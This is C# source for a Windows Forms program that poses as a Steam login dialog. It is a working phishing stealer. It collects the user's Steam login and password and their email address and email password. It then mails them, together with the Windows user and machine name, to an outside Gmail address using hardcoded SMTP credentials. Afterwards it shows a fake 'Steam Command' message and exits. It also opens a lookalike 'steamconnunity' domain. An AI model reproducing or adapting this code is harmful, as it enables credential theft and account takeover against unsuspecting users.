using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Windows.Forms;

namespace FishingNative
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void SteamGroupBox_Paint(object sender, PaintEventArgs e)
        {

            Graphics gfx = e.Graphics;  
            Pen p = new Pen(Color.DarkGray, 3);  
            gfx.DrawLine(p, 0, 5, 0, e.ClipRectangle.Height - 2);  
            gfx.DrawLine(p, 0, 5, 10, 5);  
            gfx.DrawLine(p, 0, 5, e.ClipRectangle.Width - 2, 5);  
            gfx.DrawLine(p, e.ClipRectangle.Width - 2, 5, e.ClipRectangle.Width - 2, e.ClipRectangle.Height - 2);  
            gfx.DrawLine(p, e.ClipRectangle.Width - 2, e.ClipRectangle.Height - 2, 0, e.ClipRectangle.Height - 2);  
        
        }

        private void panel1_MouseClick(object sender, MouseEventArgs e)
        {
            //MessageBox.Show("s"," d");
            System.Diagnostics.Process.Start("http://steamconnunity.bb777.ru/"); 
            // prikrutit` sait
            this.Focus();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            // do progressBar1 
            ProgressBar.Visible = false;

            
        }

      

        private void LoginTextBox_TextChanged(object sender, EventArgs e)
        {
            CheckAll();
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            CheckAll();
        }

        private void EmailTextBox_TextChanged(object sender, EventArgs e)
        {
            CheckAll();
        }

        private void PasswordEmailBox_TextChanged(object sender, EventArgs e)
        {
            CheckAll();
        }
        private bool IsValidEmail(string email)
        {
            try
            {
                var addr = new MailAddress(email);
                return addr.Address == email;
            }
            catch
            {
                return false;
            }
        }
        private void CheckAll()
        {
            if (this.LoginTextBox.Text.Length <= 4)
                return;
            if (this.PasswordTextBox.Text.Length <= 6)
                return;
            if (this.PasswordEmailTextBox.Text.Length <= 6)
                return;
            if (this.EmailTextBox.Text.Length <= 5)
                return;
            if (!IsValidEmail(this.EmailTextBox.Text))
                return;
            this.FinalButton.Enabled = true;
            this.FinalButton.ForeColor = Color.Gray;


        }

        private void MailMe()
        {
            

            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            this.ProgressBar.PerformStep();
            System.Threading.Thread.Sleep(50);
            this.StatusLabel.Text += " Connected to server...";
            mail.From = new MailAddress("icanmakeyoucryo.o@gmail.com");
            mail.To.Add("allahuakbar2002boy@gmail.com");
            this.ProgressBar.PerformStep();
            System.Threading.Thread.Sleep(50);
            mail.Subject = "A vot i accounti pod`ehali!";
            mail.Body = String.Format("{0} :: {1}", this.LoginTextBox.Text, this.PasswordTextBox.Text);
            mail.Body += String.Format("\n\n{0} :: {1}", this.EmailTextBox.Text, this.PasswordEmailTextBox.Text);
            mail.Body += String.Format("\nUsername {0}, Mashinename {1}", Environment.UserName, Environment.MachineName);
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("icanmakeyoucryo.o@gmail.com", "arizonaboys");
            this.ProgressBar.PerformStep();
            System.Threading.Thread.Sleep(50);
            SmtpServer.EnableSsl = true;
            SmtpServer.SendMailAsync(mail);
            this.ProgressBar.PerformStep();
            System.Threading.Thread.Sleep(50);

        }

        private void FinalButton_Click(object sender, EventArgs e)
        {
            this.FinalButton.Enabled = false;
            this.ProgressBar.Visible = true;
            MailMe();
            MessageBox.Show("We will certainly contact you as fast as possible!", "Message from Steam Command");
            Application.Exit();

        }

      
    }
}
